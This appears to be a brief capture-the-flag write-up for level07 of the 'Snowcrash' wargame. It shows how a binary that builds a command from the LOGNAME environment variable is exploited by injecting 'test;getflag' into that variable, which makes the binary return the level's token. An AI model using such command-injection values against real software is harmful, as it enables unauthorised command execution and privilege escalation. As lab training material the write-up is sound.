# Snowcrash07

This time we have a binary that, when inspected makes uses of the env var LOGNAME to build a command  
Simply inject code in LOGNAME  
```sh
level07:~$ env LOGNAME='test;getflag' ./level07 
test
Check flag.Here is your token : REDACTED
```
Quite ez if i may
